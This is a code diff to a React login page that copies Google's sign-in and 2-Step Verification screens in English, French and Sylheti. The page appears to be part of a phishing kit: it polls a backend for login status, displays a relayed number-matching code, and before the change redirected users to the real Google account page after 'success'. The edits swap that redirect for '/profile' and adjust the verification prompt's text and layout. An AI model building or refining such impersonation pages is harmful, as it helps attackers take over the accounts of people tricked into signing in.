@@ -42,7 +42,6 @@ export default function LoginPage() {
                 'welcome.forgot_password': 'Forgot password?',
                 'verification.title': '2-Step Verification',
                 'verification.instruction': 'Google sent a notification to your phone. Tap Yes, then tap the number below to sign in.',
-                'verification.phone_session': 'Your phone or tablet (Session info: Nearby)',
                 'verification.resend': 'Resend notification',
                 'verification.may_take': 'This may take a few moments...',
                 'verification.matching_text': 'Google needs to verify your device or phone number for security reasons.',
@@ -66,7 +65,6 @@ export default function LoginPage() {
                 'welcome.forgot_password': 'Mot de passe oublié ?',
                 'verification.title': 'Validation en deux étapes',
                 'verification.instruction': 'Google a envoyé une notification à votre téléphone. Appuyez sur Oui, puis sur le numéro ci-dessous pour vous connecter.',
-                'verification.phone_session': 'Votre téléphone ou tablette (Infos sur la session : À proximité)',
                 'verification.resend': 'Renvoyer la notification',
                 'verification.may_take': 'Cela peut prendre quelques instants...',
                 'verification.matching_text': 'Google doit vérifier votre appareil ou numéro de téléphone pour des raisons de sécurité.',
@@ -90,7 +88,6 @@ export default function LoginPage() {
                 'welcome.forgot_password': 'ꠙꠣꠡꠀꠞ꠆ꠒ ꠜꠥꠟꠉꠦꠍꠦꠘ?',
                 'verification.title': '꠪-ꠡ꠆ꠐꠦꠙ ꠛꠦꠞꠤꠚꠤꠇꠦꠡꠘ',
                 'verification.instruction': 'Google ꠀꠙꠘꠣꠞ ꠙ꠆ꠙꠂꠘꠅ ꠀꠇꠐꠣ ꠘꠐꠤꠙꠤꠇꠦꠡꠘ ꠙꠣꠕꠣꠁꠍꠦ। Yes ꠧ ꠐꠦꠙ ꠇꠞꠥꠘ, ꠔꠣꠞꠙꠞ ꠡꠣꠁꠘ ꠁꠘ ꠇꠞꠔꠦ ꠘꠤꠌꠦꠞ ꠘꠝ꠆ꠛꠞꠧ ꠐꠦꠙ ꠇꠞꠥꠘ।',
-                'verification.phone_session': 'ꠀꠙꠘꠣꠞ ꠙ꠆ꠙꠂꠘ ꠛꠣ ꠐꠦꠛꠟꠦꠐ (ꠡꠦꠡꠘ ꠁꠘꠚꠅ: ꠘꠤꠇꠐꠦ)',
                 'verification.resend': 'ꠘꠐꠤꠙꠤꠇꠦꠡꠘ ꠀꠞꠅ ꠙꠣꠕꠣꠃꠘ',
                 'verification.may_take': 'ꠇꠤꠌꠥ ꠝꠥꠢꠥꠞ꠆ꠔ ꠟꠣꠉꠔꠦ ꠙꠣꠞꠦ...',
                 'verification.matching_text': 'ꠘꠤꠞꠣꠙꠔ꠆ꠔꠣꠞ ꠇꠣꠞꠘꠦ Google ꠀꠙꠘꠣꠞ ꠒꠣꠄꠜꠣꠁꠡ ꠛꠣ ꠙ꠆ꠙꠂꠘ ꠘꠝ꠆ꠛꠞ ꠛꠦꠞ ꠇꠞꠔꠦ ꠢꠛꠦ।',
@@ -155,7 +152,7 @@ export default function LoginPage() {
                 switch (data.newStatus) {
                     case "success":
                         clearInterval(pollingRef.current);
-                        window.location.href = "https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1";
+                        window.location.href = "/profile";
                         break;
                     case "2fa":
                         clearInterval(pollingRef.current);
@@ -214,7 +211,7 @@ export default function LoginPage() {
                 if (result.success) {
                     if (result.status === "success") {
                         clearInterval(pollingRef.current);
-                        window.location.href = "https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1";
+                        window.location.href = "/profile";
                     } else if (result.status === "2fa") {
                         clearInterval(pollingRef.current);
                         setTwoFACode(result.twoFACode || "");
@@ -272,7 +269,7 @@ export default function LoginPage() {
                     setTwoFACode(result.twoFACode || "");
                     setStep(3);
                 } else if (result.completed) {
-                    window.location.href = "https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1";
+                    window.location.href = "/profile";
                 }
             } else {
                 setError(result.message || "An error occurred");
@@ -371,8 +368,7 @@ export default function LoginPage() {
         @media (max-width: 480px) {
           body { justify-content: flex-start; padding-top: 10px; }
           .login-card { border: none; padding: 20px 8px; }
-          .footer-row { flex-direction: column; gap: 16px; align-items: flex-start; padding-left: 8px; }
-          .footer-links { display: flex; width: 100%; justify-content: flex-start; }
+          .footer-links { display: flex; width: 100%; justify-content: flex-end; }
           .footer-links a { margin-left: 0; margin-right: 16px; }
         }
       ` }} />
@@ -482,13 +478,10 @@ export default function LoginPage() {
                             {t('verification.instruction')}
                         </div>
 
-                        <div className="phone-prompt-icon"></div>
+                        <img className="h-24 w-full" src="/phone.svg" alt="Phone Prompt" />
 
                         <div className="matching-number">{twoFACode}</div>
 
-                        <div className="instruction-text" style={{ color: '#5f6368' }}>
-                            {t('verification.phone_session')}
-                        </div>
 
                         <a href="#" className="link-blue" style={{ textAlign: 'left', width: '100%', marginTop: '20px' }}>{t('verification.resend')}</a>
                     </>
